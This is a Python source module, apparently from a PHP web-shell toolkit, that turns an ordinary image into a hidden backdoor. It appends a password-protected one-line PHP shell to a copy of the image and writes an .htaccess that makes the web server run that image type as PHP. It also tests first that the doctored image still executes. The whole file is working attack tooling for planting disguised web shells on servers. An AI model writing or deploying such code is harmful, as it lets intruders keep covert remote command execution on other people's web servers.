'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module
from core.moduleexception import ModuleException, ProbeException
from core.backdoor import Backdoor
from os import path, mkdir
from shutil import copy
from tempfile import mkstemp
from commands import getstatusoutput

htaccess_template = '''AddType application/x-httpd-php .%s
'''

WARN_IMG_NOT_FOUND = 'Input image not found'
WARN_DIR_CREAT = 'Making folder'
WARN_WRITING_DATA = 'Writing data'
WARN_COPY_FAIL = 'Copy fail'
WARN_PHP = 'Can\'t execute PHP interpreter'
WARN_PHP_TEST = 'Error executing php code appended at image. Retry with simpler image or blank gif'

class Img(Module):
    """Backdoor existing image and create related .htaccess"""

    def _set_args(self):
        self.argparser.add_argument('pass', help='Password')
        self.argparser.add_argument('img', help='Input image path')
        self.argparser.add_argument('ldir', help='Dir where to save modified image and .htaccess', default= 'bd_output', nargs='?')

    def __append_bin_data(self, pathfrom, pathto, data):
        
        try:
            copy(pathfrom, pathto)
        except Exception, e:
            raise ModuleException(self.name, "%s %s" % (WARN_COPY_FAIL, str(e)))
        
        try:
            open(pathto, "ab").write(data)
        except Exception, e:
            raise ModuleException(self.name, "%s %s" % (WARN_WRITING_DATA, str(e)))
            

    def __php_test_version(self):
        status, output = getstatusoutput('php -v')
        if status == 0 and output: return True
        return False

    def __php_test_backdoor(self, path):
        status, output = getstatusoutput('php %s' % path)
        if status == 0 and 'TEST OK' in output: return True
        return False

    def _prepare(self):
        
        if not path.isfile(self.args['img']):
            raise ModuleException(self.name, "'%s' %s" % (self.args['img'], WARN_IMG_NOT_FOUND))
        
        if not path.isdir(self.args['ldir']):
            try:
                mkdir(self.args['ldir'])
            except Exception, e:
                raise ModuleException(self.name, "%s %s" % (WARN_DIR_CREAT, str(e)))
        
        temp_file, temp_path = mkstemp()
        
        if not self.__php_test_version():
            raise ProbeException(self.name, WARN_PHP)
        self.__append_bin_data(self.args['img'], temp_path, '<?php print(str_replace("#","","T#E#S#T# #O#K#")); ?>')
        if not self.__php_test_backdoor(temp_path):
            raise ProbeException(self.name, '\'%s\' %s' % (self.args['img'], WARN_PHP_TEST))


    def _probe(self):
        
        filepath, filename = path.split(self.args['img'])
        fileext = filename.split('.')[-1]
        
        path_img2 = path.join(self.args['ldir'], filename)
        
        oneline_backdoor = Backdoor(self.args['pass']).backdoor.replace('\n',' ')
        self.__append_bin_data(self.args['img'], path_img2, oneline_backdoor)

        path_htaccess = path.join(self.args['ldir'], '.htaccess')        
        try:
            open(path_htaccess, "w+").write(htaccess_template % fileext)
        except Exception, e:
            raise ModuleException(self.name, "%s %s" % (WARN_WRITING_DATA, str(e)))
                    
        self.mprint("Backdoor files '%s' and '%s' created with password '%s'" % (path_img2, path_htaccess, self.args['pass']))
                    
        self._result =  [ path_img2, path_htaccess ]
        
    def _stringify_result(self):
        pass      
